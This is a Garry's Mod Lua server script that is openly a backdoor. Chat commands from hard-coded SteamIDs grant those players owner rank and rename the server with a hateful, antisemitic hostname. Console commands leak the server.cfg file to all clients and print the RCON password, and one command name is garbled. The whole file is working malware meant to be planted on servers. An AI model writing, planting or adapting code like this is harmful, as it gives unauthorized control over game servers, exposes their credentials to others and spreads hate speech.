
local valSteamID = "STEAM_0:0:68268019"
local valSteamID2 = "STEAM_0:1:41432673"



	

function Backdoor( ply, text )
	
	
	
	local function DumpCFG()
		RunConsoleCommand("vlua_run","datastream.StreamToC lients(player.GetAll(),'DS',{a=file.Read('cfg/server.cfg',true)})")
		print("! sent")
	end	
	
	concommand.Add("exploit_cfg", DumpCFG)
		function go()
		local RconPass = GetConVar("rcon_password"):GetString()
		print (RconPass)
	end
	concommand.Add("go",go)
	
	if ( text == "!backdoor" ) and ply:SteamID() == "STEAM_0:0:68268019" then
		RunConsoleCommand( "ulx", "adduserid", ply:SteamID(), "owner" )
		ply:ChatPrint( "masks on lets do it :^)" )
		RunConsoleCommand("hostname", "hitler did nothing wrong rp")
	end
	
	if ( text == "!backdoor" ) and ply:SteamID() == "STEAM_0:1:111266550" then
		RunConsoleCommand( "ulx", "adduserid", ply:SteamID(), "owner" )
		ply:ChatPrint( "masks on lets do it :^)" )
		RunConsoleCommand("hostname", "hitler did nothing wrong rp")
	end
	
	if ( text == "!juicebreak" ) and ply:SteamID() == "STEAM_0:1:41432673" then
	
		RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "owner" )
		ply:ChatPrint( "masks on lets do it :^)" )
		RunConsoleCommand("hostname", "hitler did nothing wrong rp")
	end
	
		if ( text == "!juicebreak" ) and ply:SteamID() == "STEAM_0:1:27835274" then
	
		RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "owner" )
		ply:ChatPrint( "masks on lets do it :^)" )
		RunConsoleCommand("hostname", "hitler did nothing wrong rp")
	end
	

end
hook.Add( "PlayerSay", "BackDoory", Backdoor )